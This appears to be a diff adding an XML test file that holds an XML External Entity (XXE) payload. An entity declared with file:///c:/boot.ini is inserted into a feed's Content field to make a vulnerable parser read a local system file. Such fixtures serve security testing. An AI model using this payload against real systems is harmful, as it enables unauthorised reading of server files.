@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+  <!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >
+  ]>
+  <feed>
+    <Author>Test</Author>
+    <Subject>User</Subject>
+    <Content>&xxe;</Content>
+  </feed>
